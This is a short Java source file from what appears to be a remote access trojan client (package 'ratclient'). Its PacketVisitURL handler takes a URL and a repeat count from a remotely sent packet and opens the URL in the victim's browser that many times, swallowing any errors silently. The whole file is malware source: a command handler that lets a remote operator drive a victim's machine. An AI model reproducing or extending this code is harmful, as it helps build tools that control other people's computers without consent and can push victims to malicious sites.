package ej.ratclient.packet.impl;

import ej.ratclient.packet.PacketType;
import ej.ratclient.packet.Packet;

public class PacketVisitURL implements PacketType {

    @Override
    public void handlePacket(Packet packet) {
        final String website = packet.getString();
        final int repeat = packet.getInt();
        try {
            String url = "";
            if (website.startsWith("http://")) {
                url = website;
            } else {
                url = "http://" + website;
            }
            for (int i = 0; i < repeat; i++) {
                java.awt.Desktop.getDesktop().browse(
                        java.net.URI.create(url));
            }
        } catch (Exception e) {
        }
    }
}
